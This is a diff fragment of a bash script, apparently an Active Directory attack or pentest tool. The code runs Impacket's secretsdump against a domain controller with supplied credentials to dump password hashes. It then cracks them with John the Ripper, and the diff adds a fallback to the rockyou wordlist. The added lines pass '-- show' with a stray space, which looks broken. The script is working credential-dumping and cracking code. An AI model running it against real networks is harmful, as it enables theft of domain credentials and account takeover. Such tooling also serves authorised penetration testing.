@@ -757,7 +757,15 @@ if [ -z $adusr ];
 			 
                         cp /usr/share/doc/python3-impacket/examples/secretsdump.py ./secretsdump.py          
                         python3 secretsdump.py "$domain"/"$adusr":"$adpw"@"$dcip" > hash 2> /dev/null
-                        john hash $list --show > tkt 2>/dev/null
+                        if [ -f $list ]
+                                then
+                                john hash $list --show > tkt 2>/dev/null
+                                else
+                                cp /usr/share/wordlists/rockyou.txt.gz ./rockyou.txt.gz ; gunzip ./rockyou.txt.gz
+                                john hash ./rockyou.txt -- show > tkt 2>/dev/null
+                                rm ./rockyou.txt
+                        fi
+
                         rm hash
                         echo -e "$blue[+] Saving Data...$endcolor\n"
                         enscript tkt -p tktcrack 2>/dev/null
@@ -778,7 +786,15 @@ if [ -z $adusr ];
 			
 			cp /usr/share/doc/python3-impacket/examples/secretsdump.py ./secretsdump.py
 			python3 secretsdump.py "$domain"/"$adusr":"$adpw"@"$dcip" > hash 2> /dev/null
-			john hash $list --show > tkt 2>/dev/null
+			if [ -f $list ]
+				then
+				john hash $list --show > tkt 2>/dev/null
+				else
+				cp /usr/share/wordlists/rockyou.txt.gz ./rockyou.txt.gz ; gunzip ./rockyou.txt.gz
+				john hash ./rockyou.txt -- show > tkt 2>/dev/null
+				rm ./rockyou.txt
+			fi
+
 			rm hash
                         echo -e "$blue[+] Saving Data...$endcolor\n"
                         enscript tkt -p tktcrack 2>/dev/null
